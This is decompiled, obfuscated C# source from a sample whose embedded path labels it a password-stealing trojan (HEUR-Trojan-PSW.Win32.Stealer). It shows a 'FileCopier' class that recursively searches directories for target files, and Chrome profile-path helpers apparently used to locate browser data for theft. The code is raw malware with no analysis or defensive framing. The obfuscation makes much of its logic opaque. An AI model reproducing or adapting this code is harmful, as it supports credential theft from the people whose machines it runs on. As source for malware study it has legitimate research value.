// Decompiled with JetBrains decompiler
// Type: FileCopier
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Collections.Generic;
using System.IO;

public class FileCopier
{
  public static List<string> FindPaths(
    string baseDirectory,
    int maxLevel = 4,
    int level = 1,
    params string[] files)
  {
    List<string> pathList1 = TemplateHelper.RegisterFile();
    List<string> pathList2 = pathList1;
    char[] pathList3 = new char[TemplateService.RegisterFile(380)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList3, __fieldref (VectorContext.previousHandler));
    string generatorCache1 = TreeNodeType.RegisterFile(pathList3);
    PageHelper.RegisterFile((object) pathList2, generatorCache1);
    List<string> pathList4 = pathList1;
    char[] pathList5 = new char[TemplateService.RegisterFile(384)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList5, __fieldref (VectorContext.namesEnabled));
    string generatorCache2 = TreeNodeType.RegisterFile(pathList5);
    PageHelper.RegisterFile((object) pathList4, generatorCache2);
    List<string> pathList6 = pathList1;
    char[] pathList7 = new char[TemplateService.RegisterFile(388)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList7, __fieldref (VectorContext.pathList));
    string generatorCache3 = TreeNodeType.RegisterFile(pathList7);
    PageHelper.RegisterFile((object) pathList6, generatorCache3);
    List<string> pathList8 = pathList1;
    char[] pathList9 = new char[TemplateService.RegisterFile(392)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList9, __fieldref (VectorContext.namesEnabled));
    string generatorCache4 = TreeNodeType.RegisterFile(pathList9);
    PageHelper.RegisterFile((object) pathList8, generatorCache4);
    List<string> pathList10 = TemplateHelper.RegisterFile();
    if (files != null)
    {
label_1:
      switch (5)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (FileCopier.FindPaths);
          }
          if (files.Length != 0)
          {
label_5:
            switch (7)
            {
              case 0:
                goto label_5;
              default:
                if (level > maxLevel)
                {
label_7:
                  switch (1)
                  {
                    case 0:
                      goto label_7;
                  }
                }
                else
                {
                  try
                  {
                    string[] strArray = ReferenceEditor.RegisterFile(baseDirectory);
                    for (int index1 = TemplateService.RegisterFile(396); index1 < strArray.Length; index1 += TemplateService.RegisterFile(436))
                    {
                      string pathList11 = strArray[index1];
                      bool flag1 = TemplateService.RegisterFile(400) != 0;
                      using (List<string>.Enumerator pathList12 = OutlineLoader.RegisterFile((object) pathList1))
                      {
                        while (SymbolToken.RegisterFile(ref pathList12))
                        {
                          string generatorCache5 = SolutionList.RegisterFile(ref pathList12);
                          if (SolutionSet.RegisterFile((object) pathList11, generatorCache5))
                          {
label_13:
                            switch (1)
                            {
                              case 0:
                                goto label_13;
                              default:
                                flag1 = TemplateService.RegisterFile(404) != 0;
                                goto label_18;
                            }
                          }
                        }
label_16:
                        switch (1)
                        {
                          case 0:
                            goto label_16;
                        }
                      }
label_18:
                      if (!flag1)
                      {
label_19:
                        switch (3)
                        {
                          case 0:
                            goto label_19;
                          default:
                            try
                            {
                              DirectoryInfo pathList13 = ActionInfo.RegisterFile(pathList11);
                              FileInfo[] fileInfoArray = AddinList.RegisterFile((object) pathList13);
                              bool flag2 = TemplateService.RegisterFile(408) != 0;
label_33:
                              for (int index2 = TemplateService.RegisterFile(412); index2 < fileInfoArray.Length; index2 += TemplateService.RegisterFile(428))
                              {
                                if (!flag2)
                                {
label_22:
                                  switch (5)
                                  {
                                    case 0:
                                      goto label_22;
                                    default:
                                      for (int index3 = TemplateService.RegisterFile(416); index3 < files.Length; index3 += TemplateService.RegisterFile(424))
                                      {
                                        if (!flag2)
                                        {
label_25:
                                          switch (5)
                                          {
                                            case 0:
                                              goto label_25;
                                            default:
                                              string file = files[index3];
                                              FileInfo pathList14 = fileInfoArray[index2];
                                              string generatorCache6 = ConditionStream.RegisterFile((object) pathList14);
                                              if (PaneService.RegisterFile(file, generatorCache6))
                                              {
label_27:
                                                switch (2)
                                                {
                                                  case 0:
                                                    goto label_27;
                                                  default:
                                                    flag2 = TemplateService.RegisterFile(420) != 0;
                                                    PageHelper.RegisterFile((object) pathList10, PcitureSettings.RegisterFile((object) pathList14));
                                                    continue;
                                                }
                                              }
                                              else
                                                continue;
                                          }
                                        }
                                        else
                                          goto label_33;
                                      }
label_31:
                                      switch (3)
                                      {
                                        case 0:
                                          goto label_31;
                                        default:
                                          continue;
                                      }
                                  }
                                }
                                else
                                  goto label_35;
                              }
label_34:
                              switch (5)
                              {
                                case 0:
                                  goto label_34;
                              }
label_35:
                              using (List<string>.Enumerator pathList15 = OutlineLoader.RegisterFile((object) ContextFactory.RegisterFile(PcitureSettings.RegisterFile((object) pathList13), maxLevel, level + TemplateService.RegisterFile(432), files)))
                              {
                                while (SymbolToken.RegisterFile(ref pathList15))
                                {
                                  string generatorCache7 = SolutionList.RegisterFile(ref pathList15);
                                  if (!VectorHelper.RegisterFile((object) pathList10, generatorCache7))
                                  {
label_38:
                                    switch (3)
                                    {
                                      case 0:
                                        goto label_38;
                                      default:
                                        PageHelper.RegisterFile((object) pathList10, generatorCache7);
                                        continue;
                                    }
                                  }
                                }
label_41:
                                switch (6)
                                {
                                  case 0:
                                    goto label_41;
                                }
                              }
                              continue;
                            }
                            catch
                            {
                              continue;
                            }
                        }
                      }
                    }
label_47:
                    switch (3)
                    {
                      case 0:
                        goto label_47;
                    }
                  }
                  catch
                  {
                  }
                  return pathList10;
                }
                break;
            }
          }
          else
            break;
      }
    }
    return pathList10;
  }

  public static string ChromeGetName(string path)
  {
    try
    {
      string pathList1 = path;
      char[] generatorCache1 = new char[TemplateService.RegisterFile(440)];
      generatorCache1[TemplateService.RegisterFile(444)] = (char) TemplateService.RegisterFile(448);
      int previousHandler = TemplateService.RegisterFile(452);
      string[] strArray = SelectionSet.RegisterFile((object) pathList1, generatorCache1, (StringSplitOptions) previousHandler);
      string pathList2 = strArray[strArray.Length - TemplateService.RegisterFile(456)];
      char[] pathList3 = new char[TemplateService.RegisterFile(460)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList3, __fieldref (VectorContext.dataLength));
      string generatorCache2 = TreeNodeType.RegisterFile(pathList3);
      if (SolutionSet.RegisterFile((object) pathList2, generatorCache2))
      {
label_1:
        switch (3)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (FileCopier.ChromeGetName);
            }
            return strArray[strArray.Length - TemplateService.RegisterFile(464)];
        }
      }
    }
    catch
    {
    }
    return StreamProvider.RegisterFile(812);
  }

  public static string ChromeGetRoamingName(string path)
  {
    try
    {
      string pathList1 = path;
      string[] generatorCache1 = new string[TemplateService.RegisterFile(468)];
      int index = TemplateService.RegisterFile(472);
      char[] pathList2 = new char[TemplateService.RegisterFile(476)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList2, __fieldref (VectorContext.generatorCache));
      string str = TreeNodeType.RegisterFile(pathList2);
      generatorCache1[index] = str;
      int previousHandler1 = TemplateService.RegisterFile(480);
      string pathList3 = ActionInvoker.RegisterFile((object) pathList1, generatorCache1, (StringSplitOptions) previousHandler1)[TemplateService.RegisterFile(484)];
      char[] generatorCache2 = new char[TemplateService.RegisterFile(488)];
      generatorCache2[TemplateService.RegisterFile(492)] = (char) TemplateService.RegisterFile(496);
      int previousHandler2 = TemplateService.RegisterFile(500);
      return SelectionSet.RegisterFile((object) pathList3, generatorCache2, (StringSplitOptions) previousHandler2)[TemplateService.RegisterFile(504)];
    }
    catch
    {
    }
    return string.Empty;
  }

  public static string ChromeGetLocalName(string path)
  {
    try
    {
      string pathList1 = path;
      string[] generatorCache1 = new string[TemplateService.RegisterFile(508)];
      int index = TemplateService.RegisterFile(512);
      char[] pathList2 = new char[TemplateService.RegisterFile(516)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList2, __fieldref (VectorContext.pathList));
      string str = TreeNodeType.RegisterFile(pathList2);
      generatorCache1[index] = str;
      int previousHandler1 = TemplateService.RegisterFile(520);
      string pathList3 = ActionInvoker.RegisterFile((object) pathList1, generatorCache1, (StringSplitOptions) previousHandler1)[TemplateService.RegisterFile(524)];
      char[] generatorCache2 = new char[TemplateService.RegisterFile(528)];
      generatorCache2[TemplateService.RegisterFile(532)] = (char) TemplateService.RegisterFile(536);
      int previousHandler2 = TemplateService.RegisterFile(540);
      string[] strArray = SelectionSet.RegisterFile((object) pathList3, generatorCache2, (StringSplitOptions) previousHandler2);
      return ToolbarOptions.RegisterFile(strArray[TemplateService.RegisterFile(544)], StreamProvider.RegisterFile(827), strArray[TemplateService.RegisterFile(548)], StreamProvider.RegisterFile(832));
    }
    catch
    {
    }
    return string.Empty;
  }
}
